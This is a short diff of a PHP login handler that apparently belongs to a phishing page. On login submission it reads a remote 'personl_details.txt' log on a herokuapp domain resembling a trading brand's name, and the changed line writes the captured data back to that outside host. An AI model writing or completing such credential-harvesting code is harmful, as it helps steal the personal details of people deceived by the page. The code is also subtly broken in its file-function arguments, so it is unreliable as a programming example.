@@ -21,7 +21,7 @@ if (isset($_POST['login'])) {
 
 	$file_points = "https://derivv.herokuapp.com/log/personl_details.txt";
 	$save= file_get_contents($file_points,$body);
-	file_put_contents($file_pointer, $open);
+	file_put_contents($file_points, $save);
 	//fwrite($save,$body);
 	//fclose($save);
 }
